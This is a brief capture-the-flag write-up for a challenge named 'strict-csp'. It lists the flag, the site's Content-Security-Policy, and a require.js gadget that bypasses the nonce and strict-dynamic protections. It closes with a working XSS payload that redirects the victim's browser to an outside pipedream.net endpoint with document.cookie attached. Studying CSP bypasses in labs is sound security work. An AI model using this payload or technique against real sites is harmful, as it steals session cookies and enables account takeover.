# strict-csp

`flag{th4t-w4s3nt-s0-str1ct-w4snt-it?}`

```
Content-Security-Policy
default-src 'self'; script-src 'strict-dynamic' 'nonce-Tem71LBRvr';
style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;
font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;object-src 'none'
```

No unsafe eval
Nonce
Strict dynamic

Require.js bypass

It is possible to load additional code with source requires.js
This means that the code will be loaded together with a script with nonce.

```js
<script
  data-main="data:1,document.location='https://eof1z0pcrn07ets.m.pipedream.net?cookie='+document.cookie"
  src="require.js"
></script>
```
